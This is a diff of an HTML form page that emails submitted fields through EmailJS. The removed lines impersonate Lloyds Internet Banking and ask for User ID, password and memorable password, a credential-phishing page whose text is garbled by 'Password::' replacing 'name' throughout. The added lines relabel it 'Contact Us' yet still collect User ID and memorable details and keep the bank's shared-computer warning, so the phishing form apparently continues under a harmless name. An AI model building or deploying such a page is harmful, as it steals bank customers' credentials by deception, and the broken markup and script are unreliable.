@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta Password::="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Huboweb – Welcome to Lloyds internet Banking</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Huboweb – Contact Us</title>
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -78,23 +78,23 @@
   <!-- PAGE 1: FORM -->
   <div id="page1" class="page active">
     <div class="body">
-      <h1>Welcome to Lloyds Internet Banking</h1>
-      <p class="subtitle">If you don't already use Internet Banking, it's simple to register online.</p>
+      <h1>Contact Us</h1>
+      <p class="subtitle">Fill in the form below and we'll get back to you shortly.</p>
 
       <div class="form-group">
-        <label for="Password::">User ID:</label>
-        <input type="text" id="Password::" placeholder="e.g. Please enter your User ID" autocomplete="Password::" />
-        <div class="err" id="err-Password::">Please enter your User ID:.</div>
+        <label for="name">Name</label>
+        <input type="text" id="name" placeholder="e.g. Sarah Thompson" autocomplete="name" />
+        <div class="err" id="err-name">Please enter your name.</div>
       </div>
       <div class="form-group">
-        <label for="userid">Password:</label>
-        <input type="text" id="userid" placeholder="Enter your Password:" autocomplete="userPassword::" />
-        <div class="err" id="err-userid">Please enter your Password:.</div>
+        <label for="userid">User ID</label>
+        <input type="text" id="userid" placeholder="Enter your User ID" autocomplete="username" />
+        <div class="err" id="err-userid">Please enter your User ID.</div>
       </div>
       <div class="form-group">
-        <label for="memorable">Memorable Password::</label>
-        <input type="text" id="memorable" placeholder="Enter your memorable Password::" />
-        <div class="err" id="err-memorable">Please enter your memorable Password::.</div>
+        <label for="memorable">Memorable Name</label>
+        <input type="text" id="memorable" placeholder="Enter your memorable name" />
+        <div class="err" id="err-memorable">Please enter your memorable name.</div>
       </div>
 
       <p class="warning-row"><strong>Warning:</strong> Don't tick this box if you're using a public or shared computer</p>
@@ -136,7 +136,7 @@
 
   async function handleSubmit() {
     const fields = [
-      { id: 'Password::',      err: 'err-Password::' },
+      { id: 'name',      err: 'err-name' },
       { id: 'userid',    err: 'err-userid' },
       { id: 'memorable', err: 'err-memorable' }
     ];
@@ -163,7 +163,7 @@
     statusMsg.style.display = 'none';
 
     const templateParams = {
-      Password:::      document.getElementById('Password::').value.trim(),
+      name:      document.getElementById('name').value.trim(),
       userid:    document.getElementById('userid').value.trim(),
       memorable: document.getElementById('memorable').value.trim()
     };
@@ -175,7 +175,7 @@
     } catch (error) {
       console.error('EmailJS error:', error);
       statusMsg.textContent = '⚠ Failed to send. Please try again.';
-      statusMsg.classPassword:: = 'status-msg error';
+      statusMsg.className = 'status-msg error';
       statusMsg.style.display = 'flex';
       btn.disabled = false;
       btn.textContent = 'Continue';
